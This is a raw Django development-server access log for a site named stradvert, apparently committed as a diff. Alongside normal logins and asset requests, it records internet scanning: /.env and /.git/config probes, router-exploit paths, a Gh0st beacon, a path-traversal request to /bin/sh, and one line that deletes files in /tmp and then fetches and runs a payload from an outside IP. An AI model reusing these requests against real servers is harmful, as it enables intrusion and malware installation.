+[30/Mar/2023 07:13:03] "GET / HTTP/1.1" 400 65419
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /0bef
+[30/Mar/2023 07:38:33,126] - Broken pipe from ('194.165.16.10', 57403)
+
+[30/Mar/2023 07:38:33] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[30/Mar/2023 07:38:33] "  ,'à     Cookie: mstshash=Domain" 400 -
+[30/Mar/2023 07:38:33] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[30/Mar/2023 07:38:33] "  ,'à     Cookie: mstshash=Domain" 400 -
+[30/Mar/2023 07:48:24] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 07:53:22] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 08:34:59] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[30/Mar/2023 08:43:03] "GET / HTTP/1.1" 400 64944
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /.well-known/assetlinks.json
+[30/Mar/2023 08:44:55] "GET /.well-known/assetlinks.json HTTP/1.1" 400 64911
+Bad Request: /.well-known/assetlinks.json
+[30/Mar/2023 08:44:55] "GET /.well-known/assetlinks.json HTTP/1.1" 400 64908
+[30/Mar/2023 08:45:56] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 09:04:30] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /
+[30/Mar/2023 09:21:33] "GET / HTTP/1.1" 400 62706
+[30/Mar/2023 09:47:14] code 400, message Bad request version ("x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|")
+[30/Mar/2023 09:47:14] "238 ll|'|'|SGFjS2VkX0Q3NUU2QUFB|'|'|WIN-QZN7FJ7D1O|'|'|Administrator|'|'|18-11-28|'|'||'|'|Win 7 Ultimate SP1 x64|'|'|No|'|'|S17|'|'|..|'|'|SW5ib3ggLSBPdXRsb29rIERhdGEgRmlsZSAtIE1pY3Jvc29mdCBPdXRsb29rAA==|'|'|" 400 -
+[30/Mar/2023 09:47:14] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 09:53:15] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 09:53:19] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 09:54:55] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 09:55:00] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 09:55:44] "GET /favicon.ico HTTP/1.1" 301 0
+[30/Mar/2023 09:55:46] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 09:55:47] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 10:02:52] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 10:02:53] "GET /favicon.ico HTTP/1.1" 302 0
+[30/Mar/2023 10:02:55] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[30/Mar/2023 10:11:34] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 10:17:43] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 10:18:08] "GET /favicon.ico HTTP/1.1" 302 0
+[30/Mar/2023 10:18:08] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[30/Mar/2023 10:18:09] "GET /favicon.ico HTTP/1.1" 302 0
+[30/Mar/2023 10:18:10] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[30/Mar/2023 10:19:23] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 10:19:54] "GET /favicon.ico HTTP/1.1" 302 0
+[30/Mar/2023 10:20:00] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 10:20:18] "GET /favicon.ico HTTP/1.1" 302 0
+[30/Mar/2023 10:20:18] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[30/Mar/2023 10:20:55] "GET /favicon.ico HTTP/1.1" 302 0
+[30/Mar/2023 10:20:55] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[30/Mar/2023 11:02:16] "POST /cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh HTTP/1.1" 301 0
+[30/Mar/2023 11:06:03] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 11:06:06] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 11:06:06] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[30/Mar/2023 11:06:07] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[30/Mar/2023 11:06:07] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[30/Mar/2023 11:06:07] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[30/Mar/2023 11:06:07] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[30/Mar/2023 11:06:07] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[30/Mar/2023 11:06:12] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 11:06:12] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 11:06:12] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[30/Mar/2023 11:06:12] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[30/Mar/2023 11:06:12] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[30/Mar/2023 11:06:12] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[30/Mar/2023 11:06:12] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[30/Mar/2023 11:06:13] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[30/Mar/2023 11:47:34] "GET /robots.txt HTTP/1.1" 302 0
+[30/Mar/2023 11:47:34] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[30/Mar/2023 11:47:34] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[30/Mar/2023 11:54:24] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 11:54:24] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 304 0
+[30/Mar/2023 11:54:24] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[30/Mar/2023 11:54:24] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 304 0
+[30/Mar/2023 11:54:25] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 304 0
+[30/Mar/2023 11:54:25] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 304 0
+[30/Mar/2023 11:54:25] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 304 0
+[30/Mar/2023 11:54:25] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 304 0
+[30/Mar/2023 11:54:25] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 304 0
+[30/Mar/2023 11:54:25] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 304 0
+[30/Mar/2023 11:54:26] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 304 0
+[30/Mar/2023 11:54:26] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 304 0
+[30/Mar/2023 11:54:26] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 304 0
+[30/Mar/2023 11:54:27] "GET /static/str-logo.png HTTP/1.1" 304 0
+[30/Mar/2023 11:54:29] "GET /login/ HTTP/1.1" 200 5163
+[30/Mar/2023 11:54:59] "POST /login/ HTTP/1.1" 302 0
+[30/Mar/2023 11:55:00] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 11:55:01] "GET /static/assets/vendor/chart.js/dist/Chart.min.js HTTP/1.1" 304 0
+[30/Mar/2023 11:55:01] "GET /static/assets/vendor/chart.js/dist/Chart.extension.js HTTP/1.1" 304 0
+[30/Mar/2023 11:55:01] "GET /static/assets/vendor/@fortawesome/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 304 0
+[30/Mar/2023 12:24:18] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[30/Mar/2023 12:38:17] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 0
+[30/Mar/2023 12:38:20] code 400, message Bad request version ('À\x13À')
+[30/Mar/2023 12:38:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Mar/2023 12:53:30] "GET /.git/config HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[30/Mar/2023 13:39:19] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 13:40:25] code 400, message Bad request version ('À\x14À')
+[30/Mar/2023 13:40:25] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Mar/2023 13:53:28] "GET /actuator/gateway/routes HTTP/1.1" 301 0
+[30/Mar/2023 13:53:28] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00ê\x01\x00\x00æ\x03\x03Iº\x08¼P\x0ek³u9í-úV\x16(')
+[30/Mar/2023 13:53:28] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Mar/2023 14:54:02] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 14:55:21] code 400, message Bad request version ('À\x14À')
+[30/Mar/2023 14:55:21] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Mar/2023 14:55:21] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 14:55:22] "GET /client/get_targets HTTP/1.1" 301 0
+[30/Mar/2023 14:55:22] "GET /upl.php HTTP/1.1" 301 0
+[30/Mar/2023 14:55:23] code 400, message Bad request version ('À\x14À')
+[30/Mar/2023 14:55:23] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Mar/2023 14:55:23] "GET /geoip/ HTTP/1.1" 301 0
+[30/Mar/2023 14:55:24] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 14:55:24] "GET /favicon.ico HTTP/1.1" 301 0
+[30/Mar/2023 14:59:42] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 15:27:28] "GET /robots.txt HTTP/1.1" 302 0
+[30/Mar/2023 15:38:58] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[30/Mar/2023 15:50:39] "GET /assets/plugins/jQuery-File-Upload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 301 0
+[30/Mar/2023 15:51:06] "GET /assets/plugins/jQuery-File-Upload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 302 0
+[30/Mar/2023 16:01:45] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 16:12:38] "GET /_ignition/health-check HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'stradvert'. You may need to add 'stradvert' to ALLOWED_HOSTS.
+Bad Request: /
+[30/Mar/2023 16:27:02] "HEAD / HTTP/1.1" 200 3497
+[30/Mar/2023 17:29:01] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 17:31:49] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 17:34:03,855] - Broken pipe from ('167.94.138.126', 45142)
+
+[30/Mar/2023 17:34:04] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 17:34:04] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 17:34:05] code 505, message Invalid HTTP version (2.0)
+[30/Mar/2023 17:34:05] "PRI * HTTP/2.0" 505 -
+[30/Mar/2023 18:03:25] "GET /robots.txt HTTP/1.1" 301 0
+[30/Mar/2023 18:03:26] "GET /robots.txt HTTP/1.1" 302 0
+[30/Mar/2023 18:03:26] "GET /login/?next=/robots.txt HTTP/1.1" 200 5163
+[30/Mar/2023 18:07:40] "GET /login/?next=/ HTTP/1.1" 200 5163
+[30/Mar/2023 18:09:21] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 18:19:53] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 18:37:22] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 18:37:22] "GET /favicon.ico HTTP/1.1" 302 0
+[30/Mar/2023 18:37:23] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[30/Mar/2023 19:01:15] "GET /.git/config HTTP/1.1" 301 0
+[30/Mar/2023 19:01:16] "GET /.git/config HTTP/1.1" 302 0
+[30/Mar/2023 19:01:16] "GET /login/?next=/.git/config HTTP/1.1" 200 5163
+[30/Mar/2023 19:03:21] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 19:25:03] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 19:25:03] code 505, message Invalid HTTP version (2.0)
+[30/Mar/2023 19:25:03] "PRI * HTTP/2.0" 505 -
+[30/Mar/2023 19:25:04] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 19:25:04] code 505, message Invalid HTTP version (2.0)
+[30/Mar/2023 19:25:04] "PRI * HTTP/2.0" 505 -
+[30/Mar/2023 19:25:04] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 19:25:04] code 505, message Invalid HTTP version (2.0)
+[30/Mar/2023 19:25:04] "PRI * HTTP/2.0" 505 -
+[30/Mar/2023 19:47:24] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 19:47:25] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[30/Mar/2023 19:47:25] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 304 0
+[30/Mar/2023 19:47:25] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 304 0
+[30/Mar/2023 19:47:25] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 304 0
+[30/Mar/2023 19:47:25] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 304 0
+[30/Mar/2023 19:47:25] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 304 0
+[30/Mar/2023 19:47:25] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 304 0
+[30/Mar/2023 19:47:25] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[30/Mar/2023 19:47:26] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 304 0
+[30/Mar/2023 19:47:26] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[30/Mar/2023 19:47:26] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[30/Mar/2023 19:47:27] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[30/Mar/2023 19:47:32] "GET /login/ HTTP/1.1" 200 5163
+[30/Mar/2023 19:48:15] "POST /login/ HTTP/1.1" 302 0
+[30/Mar/2023 19:48:16] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 19:48:18] "GET /static/assets/vendor/chart.js/dist/Chart.min.js HTTP/1.1" 200 172812
+[30/Mar/2023 19:48:18] "GET /static/assets/vendor/chart.js/dist/Chart.extension.js HTTP/1.1" 200 3552
+[30/Mar/2023 19:48:22] "GET /static/assets/vendor/@fortawesome/fontawesome-free/webfonts/fa-solid-900.woff2 HTTP/1.1" 304 0
+[30/Mar/2023 19:49:13] "GET /profile.html HTTP/1.1" 200 8948
+[30/Mar/2023 19:49:14] "GET /static/assets/img/theme/user.png HTTP/1.1" 200 24784
+[30/Mar/2023 19:49:31] "GET /dashboard HTTP/1.1" 200 13279
+[30/Mar/2023 19:50:02] "GET /logout/ HTTP/1.1" 302 0
+[30/Mar/2023 19:50:08] "GET /dashboard HTTP/1.1" 302 0
+[30/Mar/2023 19:50:09] "GET /login/?next=/dashboard HTTP/1.1" 200 5163
+[30/Mar/2023 19:52:19] "GET /profile.html HTTP/1.1" 302 0
+[30/Mar/2023 19:52:20] "GET /login/?next=/profile.html HTTP/1.1" 200 5163
+[30/Mar/2023 19:52:35] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 20:05:17] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 20:38:33] code 400, message Bad request version ('À\x14À')
+[30/Mar/2023 20:38:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Mar/2023 20:38:34] code 400, message Bad request version ('À\x14À')
+[30/Mar/2023 20:38:34] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Mar/2023 20:38:34] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 20:38:35] "GET /client/get_targets HTTP/1.1" 301 0
+[30/Mar/2023 20:38:35] "GET /upl.php HTTP/1.1" 301 0
+[30/Mar/2023 20:38:36] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Ë9£\x18R\x7fw')
+[30/Mar/2023 20:38:36] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[30/Mar/2023 20:38:36] "GET /geoip/ HTTP/1.1" 301 0
+[30/Mar/2023 20:38:37] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 20:38:37] "GET /favicon.ico HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[30/Mar/2023 20:45:12] "GET / HTTP/1.1" 400 64672
+Invalid HTTP_HOST header: 'www.stradvert.com:443'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[30/Mar/2023 20:45:13] "GET / HTTP/1.1" 400 64840
+[30/Mar/2023 20:48:53] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 20:52:56] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'mail.stradvert.com'. You may need to add 'mail.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[30/Mar/2023 21:18:04] "GET / HTTP/1.1" 400 64480
+[30/Mar/2023 21:37:11] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[30/Mar/2023 22:04:55] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 22:12:26] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 22:14:44] "GET / HTTP/1.1" 200 3497
+[30/Mar/2023 22:14:45] "GET /favicon.ico HTTP/1.1" 302 0
+[30/Mar/2023 22:14:45] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[30/Mar/2023 22:22:16] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 22:27:38] code 400, message Bad request version ('À\x13À')
+[30/Mar/2023 22:27:38] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /
+[30/Mar/2023 22:27:38] "GET / HTTP/1.1" 400 62771
+[30/Mar/2023 22:27:39] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 22:27:39] "GET /.env HTTP/1.1" 301 0
+[30/Mar/2023 22:51:10] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 23:01:36] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 23:15:59] "GET / HTTP/1.1" 301 0
+[30/Mar/2023 23:47:37] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 00:11:13] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[31/Mar/2023 00:35:17] "GET /wp-login.php HTTP/1.1" 301 0
+[31/Mar/2023 00:35:17] "GET /wp-login.php HTTP/1.1" 302 0
+[31/Mar/2023 00:35:18] "GET /login/?next=/wp-login.php HTTP/1.1" 200 5163
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /shell
+[31/Mar/2023 00:37:01] "GET /shell?cd+/tmp;rm+-rf+*;wget+204.44.109.117/jaws;sh+/tmp/jaws HTTP/1.1" 400 64107
+[31/Mar/2023 01:30:27] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 02:41:03] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 02:54:16] "GET /login/?next=/dashboard HTTP/1.1" 200 5163
+[31/Mar/2023 02:54:17] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[31/Mar/2023 02:54:17] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 304 0
+[31/Mar/2023 02:54:17] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 304 0
+[31/Mar/2023 02:54:17] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 304 0
+[31/Mar/2023 02:54:17] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 304 0
+[31/Mar/2023 02:54:17] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 304 0
+[31/Mar/2023 02:54:17] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 304 0
+[31/Mar/2023 02:54:17] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 304 0
+[31/Mar/2023 02:54:17] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 304 0
+[31/Mar/2023 02:54:17] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 304 0
+[31/Mar/2023 02:54:18] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[31/Mar/2023 03:22:47] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 03:26:15] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 03:26:16] "GET / HTTP/1.1" 200 3497
+[31/Mar/2023 03:26:18] "GET / HTTP/1.1" 200 3497
+[31/Mar/2023 03:26:38] "GET /favicon.ico HTTP/1.1" 302 0
+[31/Mar/2023 03:26:38] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[31/Mar/2023 03:27:14] "GET /favicon.ico HTTP/1.1" 301 0
+[31/Mar/2023 03:27:17] "GET /favicon.ico HTTP/1.1" 302 0
+[31/Mar/2023 03:27:19] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 03:27:23] "GET / HTTP/1.1" 200 3497
+[31/Mar/2023 03:43:23] "GET /login/?next=/dashboard HTTP/1.1" 200 5163
+[31/Mar/2023 03:43:25] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 304 0
+[31/Mar/2023 04:03:05] "GET / HTTP/1.1" 200 3497
+[31/Mar/2023 04:03:05] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[31/Mar/2023 04:15:22] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 05:04:11] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 05:22:05] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 06:15:19] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 07:11:56] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 07:13:03] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 07:13:35] "GET /favicon.ico HTTP/1.1" 301 0
+[31/Mar/2023 07:14:27] "GET /geoserver/web/ HTTP/1.1" 301 0
+[31/Mar/2023 07:17:21] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 304 0
+[31/Mar/2023 07:17:21] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 304 0
+[31/Mar/2023 07:17:21] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 304 0
+[31/Mar/2023 07:17:22] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 304 0
+[31/Mar/2023 07:17:22] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 304 0
+[31/Mar/2023 07:17:22] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 304 0
+[31/Mar/2023 07:17:23] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 304 0
+[31/Mar/2023 07:17:23] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 304 0
+[31/Mar/2023 07:17:23] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 304 0
+[31/Mar/2023 07:17:23] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 304 0
+[31/Mar/2023 07:17:23] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 304 0
+[31/Mar/2023 07:17:24] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 304 0
+[31/Mar/2023 07:35:36] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 07:38:22] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 07:53:24] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 08:41:02] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 08:47:04] "GET /.env HTTP/1.1" 301 0
+[31/Mar/2023 08:47:04] code 400, message Bad request version ('¯¶\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+[31/Mar/2023 08:47:04] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[31/Mar/2023 08:48:43] code 400, message Bad request version ('®¯]')
+[31/Mar/2023 08:48:43] "Gh0st­   à   xKS``ÃÀÀÀÄ@¼Q	H§e&§*$&g+2ö°00¬¨rc  \`&ÇK7ån9n;3¬èsch¨^Ï4'J©ã0Ãh]&øÎSËA4L?2=áÄ@õ`T®¯]" 400 -
+[31/Mar/2023 08:59:41] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 09:00:14] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 09:09:03] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[31/Mar/2023 09:18:56] "GET / HTTP/1.1" 301 0
+[31/Mar/2023 09:19:28] "GET / HTTP/1.1" 200 3497
+[31/Mar/2023 09:19:29] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[31/Mar/2023 09:19:30] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[31/Mar/2023 09:19:30] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[31/Mar/2023 09:19:30] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[31/Mar/2023 09:19:30] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[31/Mar/2023 09:19:32] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[31/Mar/2023 09:20:11,393] - Broken pipe from ('141.101.76.184', 56644)
+
+[31/Mar/2023 09:22:34,299] - Broken pipe from ('172.71.102.129', 20952)
+
+[31/Mar/2023 09:23:58,633] - Broken pipe from ('172.71.94.53', 22564)
+
+[31/Mar/2023 09:28:21] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+[31/Mar/2023 09:28:21] "  à          " 400 -
+Invalid HTTP_HOST header: '127.0.0.1:80'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /GponForm/diag_Form
+[31/Mar/2023 09:36:10] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 63967
+Invalid HTTP_HOST header: 'ssl-judge2.api.proxyscrape.com:443'. You may need to add 'ssl-judge2.api.proxyscrape.com' to ALLOWED_HOSTS.
+Invalid HTTP_HOST header: 'judge3.api.proxyscrape.com'. You may need to add 'judge3.api.proxyscrape.com' to ALLOWED_HOSTS.
+Bad Request: /ssl-judge2.api.proxyscrape.com:443
+Bad Request: /http:/judge3.api.proxyscrape.com/
+[31/Mar/2023 09:55:05] "CONNECT ssl-judge2.api.proxyscrape.com:443 HTTP/1.1" 400 63747
+[31/Mar/2023 09:55:05] "GET http://judge3.api.proxyscrape.com/ HTTP/1.1" 400 63613
+[31/Mar/2023 09:56:37] code 400, message Bad request syntax ('\x05\x01\x00')
+[31/Mar/2023 09:56:37] " " 400 -
+[31/Mar/2023 09:56:43] code 400, message Bad request syntax ('\x05\x01\x00')
+[31/Mar/2023 09:56:43] " " 400 -
+[31/Mar/2023 09:56:49] code 400, message Bad request syntax ('\x05\x01\x00')
+[31/Mar/2023 09:56:49] " " 400 -
+[31/Mar/2023 09:58:08] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[31/Mar/2023 09:58:08] " P¼Òã " 400 -
+[31/Mar/2023 09:58:16] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
+[31/Mar/2023 09:58:16] " P¼Òã " 400 -
+[31/Mar/2023 09:58:24] code 400, message Bad request syntax ('\x04\x01\x00P\x05¼Òã\x00')
